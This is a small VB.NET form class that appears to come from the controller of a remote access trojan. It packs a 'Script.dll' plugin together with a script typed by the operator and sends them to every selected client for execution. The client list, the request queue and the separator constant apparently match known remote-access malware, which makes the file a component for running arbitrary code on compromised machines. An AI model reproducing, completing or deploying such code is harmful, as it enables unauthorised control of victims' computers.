Imports System.IO

Public Class Script
    Private Sub Script_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        TextBox1.Clear()
        ComboBox1.Text = Nothing
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If ComboBox1.Text = Nothing Or TextBox1.Text = Nothing Then
                Me.Close()
            Else
                Dim B As Byte() = SB("script" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\Script.dll")) & Settings.SPL & TextBox1.Text & Settings.SPL & ComboBox1.Text)
                For Each C As ListViewItem In Form1.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
                TextBox1.Clear()
                ComboBox1.Text = Nothing
                Me.Close()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
End Class